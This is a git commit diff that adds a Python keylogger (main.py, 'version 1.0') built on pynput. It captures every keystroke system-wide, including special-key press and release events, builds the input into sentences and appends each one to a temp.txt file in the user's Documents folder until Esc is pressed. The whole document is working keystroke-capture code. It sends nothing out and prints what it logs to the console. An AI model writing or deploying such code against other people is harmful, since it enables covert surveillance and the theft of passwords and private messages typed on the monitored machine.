c8ce4c95d57a86736ad7c784cd28975abf1dcd5d
Rithvik_Pathi <rithvikddofficial@gmail.com>
2025-04-19 15:58:32 +0530

    version 1.0

--- main.py
+++ main.py
@@ -1,22 +1,76 @@
 import pynput
 from pynput import keyboard
-from pynput.keyboard import Key, Controller
+from pynput.keyboard import Key
 import os
 
-keyboard = Controller()
+sentence = ""
+document_path = None
+temp_file = None
+pressed_special_keys = set()
 
-def file_checker(key):
+def file_checker():
+    global document_path
+    global temp_file
     document_path = os.path.expanduser("~\\Documents")
-    temp_file = os.path.join(document_path, "temp")
+    temp_file = os.path.join(document_path, "temp.txt") 
 
     if os.path.exists(temp_file):
-        with open(temp_file, "a"):
-            print(f"found existing file, writing to {temp_file}")
+        print(f"Found existing file, writing to {temp_file}")
     else:
-        open(temp_file, "xt")
-        print(f"Creating a file at {document_path}")
+        with open(temp_file, "w") as f:  
+            print(f"Creating a file at {temp_file}")
+
+def write_to_file(text):
+    global temp_file
+    if temp_file:
+        try:
+            with open(temp_file, "a") as f:
+                f.write(text + "\n")
+        except Exception as e:
+            print(f"Error writing to file: {e}")
+    else:
+        print("Temporary file path is not set.")
+
+def Press(key):
+    global sentence
+    global pressed_special_keys
+
+    try:
+        sentence += key.char
+        print(key.char)
+
+    except AttributeError:
+        if key == keyboard.Key.space:
+            sentence += " "
+        elif key == keyboard.Key.enter:
+            print(f"Sentence: {sentence}")
+            write_to_file(sentence)
+            sentence = ""
+        elif key == keyboard.Key.backspace:
+            sentence = sentence[:-1]
+        
+        
+        else:
+            special_key_name = str(key).replace('Key.', '')
+            sentence += f"<{special_key_name}_Press>"
+            pressed_special_keys.add(key)
+        
 
 
+def Release(key):
+    global sentence 
+    global pressed_special_keys
 
+    if key in pressed_special_keys:
+        special_key_name = str(key).replace('Key.', '')
+        sentence += f"<{special_key_name}_Release>"
+        pressed_special_keys.remove(key)
 
-file_checker(key=Key.media_play_pause)
+    if key == keyboard.Key.esc:
+        print("shutting")
+        return False
+
+if __name__ == "__main__":
+    file_checker()  
+    with keyboard.Listener(on_press=Press, on_release=Release) as listener:
+        listener.join()
